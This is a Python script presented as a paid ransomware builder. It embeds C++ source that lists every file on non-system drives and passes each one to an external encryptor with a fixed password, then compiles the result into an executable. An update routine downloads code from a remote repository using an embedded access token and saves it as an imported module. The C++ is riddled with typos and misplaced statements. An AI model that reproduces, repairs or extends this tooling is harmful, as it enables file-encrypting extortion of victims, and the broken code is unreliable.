"""
This paid tool has the following ToS

When using this tool nor even having it you agree to these.

  1. You Cannot Modify Or Change Anything In This Tool

  2. By Using This Tool You Agree That You Have Full RESPONSBILITY On What You Do With This
"""
VersionKey = 'https://raw.githubusercontent.com/Discordmodsbers/inferno/main/ServerKey.py?token=GHSAT0AAAAAAB5CAIMNU7DBSGOOTA45366UY5YI55Q'

version = '3'

Version1CPP = """#include <boost/config/warning_disable.hpp>
#include <boost/filesyste..hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>

using namespace std;

fstream out_file("data.txt", ios::out)

#defince MAX 256

int main(int argc, char* argv[])
{
  int dr_type = 99;
  char dr_avail[MAX];
  char *temp = dr_avail;

  /* 1st we fill the buffer */
  GetLogicalDriveStrings(MAX, dr_avail);
  while (*temp != NULL)
  {
    dr_type = GetDriveType(temp);

    char skip[10] = "C://";

    if (dr_type == 3 && temp[0] != 'C')
    {
      boost::system::error_code dir_error;

      for (boost::filesystem::recursive_directory_iterator end, dir(temp, dir_error); dir != end; dir.incrememnt(dir_error))
      {
        if (dir_error.value())
        {
          cerr << "Error accessing file: " << dir_error.message() << endl;   }
        else 
        {
          cout << dir->path() << endl;
          out_file << dir->path() << "\n";   }
      }
    }
  }
  temp += 1strlen(temp) + 1;
}
out_file.close();
system("pause");

out_file.open("data.txt", ios::in);
  while (out_file.good())
    {
      getline(out_file, line);
      cout << line << endl;
      std::string cmmd = "crpt.exe -e -p 4321";
      cmmd += line;
      system(cmmd.c_str());
    }
    }

string RandomString(int len)
{
	srand(time(0));
	string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}"""

version1 = """

"""


try:
  import time as t
  import os
  import sys
  import webbrowser
  from colorama import Fore
  import urllib.request
  import platform
  import socket
  import requests
  import array
  import requests
  from ServerKey import *
  #Color's
  green = Fore.GREEN
  reset = Fore.RESET
  red = Fore.RED

  def printslow(s):
    for c in s + '\n':
      sys.stdout.write(c)
      sys.stdout.flush()
      t.sleep(1./10)

  #Its a bit wonky but if it works. It works

  def update():
    os.system('python3 updater.py')
    

    
  def checker():
    url = VersionKey

    r = requests.get(url, allow_redirects=True)
    with open('ServerKey.py', 'wb') as f:
      f.write(r.content)
      f.close()
    if Key == version:
      print("Up To Date !")
      t.sleep(3)
    else:
      print(f"""
Update Needed !                 
Hit [{green}'y'{reset}]         
[{red}'ENTER'{reset}] to ignore  """)
      while True:
        option = input("")
        if option =='y':
          update()
        elif option =='Y':
          update()
        else:
          print("Please note there will be bugs .")
          break
  
  #Detects operating system and uses their clear screen command.
  def cls():
    if platform =='linux' or 'Linux':
      os.system('clear')
    else:
      os.system('cls')
  
  #CPP Malware Maker eheheheh
  def cpp():
    try:
      name = input("Please enter the name of the Ransomware. ")
      with open(name + ".cpp", "w") as f:
        f.write(Version1CPP)
        f.close()
      os.system(f"g++ {name}.cpp -o {name}.exe")
      while True:
        option = input("Enter If Your On Linux.\nIf Your On Windows Please Hit 'Y'")
        if option =='Y':
          break
        elif option =='':
          os.system(f'chmod +x {name}.exe')
          break
      return True
    except:
      print("Error: Could not create CPP file.")
      sys.exit()
      return False
  
  #Compiler
  def compiler():
    try:
      os.system(f'pyinstaller --onefile {name}.py')
      return True
    except:
      print(f'{green}[!]{reset} Compiler error.\n')
      return False
      sys.exit()
  
  #Detecting what is in the config file ( Builder )
  def Builder():
    try:
      print("Wut you wanna do? [python or cpp]")
      while True:
        option = input("-> ")
        if option =='python':
          name = input("Please enter the name of the Ransomware. ")
          break
        elif option =='cpp':
          cpp()
        elif option =='':
          print("Invalid option.\n")
          sys.exit()
      with open(f'{name}.py', 'w') as f:
        f.write(version1)
        f.close()
      return True
    except:
      return False
  
  #Attempts to connect to google for Wifi access.
  def connect(host='http://google.com'):
      try:
          urllib.request.urlopen(host) #Python 3.x
          return True
      except:
          return False
          sys.exit('Error: Needs Wifi Connection! ')
  
  #Main Stuff
  def main():
    #Runs all the functions
    checker()
    
    cls()
    print("""
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⠇⠈⢿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⡿⢹⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠉⠁⠀⠀⠀⠀⣰⡇⠀⠀⠀⠀⣿⣿⠃⠈⣿⣿⣿
  ⣿⡿⢻⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡇⠀⠀⠀⠀⠞⠁⠀⠀⣿⣿⣿
  ⣿⠃⠘⢿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
  ⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣦⣤⣤⣾⣿⣿⣿⣿⣷⣄⣀⣀⠀⠀⠀⢀⣿⣿⣿
  ⣿⣆⠀⠀⠀⢠⣄⣀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣼⣿⠟⣿
  ⣿⣿⡄⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠐⠉⠀⢀⣿
  ⣿⣿⣿⣆⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⡀⠀⠀⠀⢀⣼⣿
  ⣿⣿⣿⣿⣷⡀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⣠⣾⣿⣿
  ⣿⣿⣿⣿⣿⣿⣷⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣥⣤⣤⣶⣿⣿⣿⣿⣿""")
    print("    +-----------------------+")
    print(f"    | Author: [{green}Knox.exe{reset}]    | ")
    print(f"    | Version: [{red}{Key}{reset}]        |")
    if connect():
      print(f"    | Wifi Connection [{green}+{reset}]   |")
    print(f"    | To exit/stop [{red}Ctrl+C{reset}] |")
    print(f"    | Building [{green}Ransomware{reset}] |")
    print("    +-----------------------+")
    print(" Note This Will Take A While Pls hold")
    print(f"     Press [{green}Enter{reset}] to Continue")
    input("")

    if Builder():
      print(f"""
  +---------------+
  | Creating  [{green}+{reset}] |""")
    if compiler():
      print(f"| Compiled [{green}+{reset}] |")
  
  
  if __name__ == "__main__":
    main()

except KeyboardInterrupt:
  print("Exiting now....")
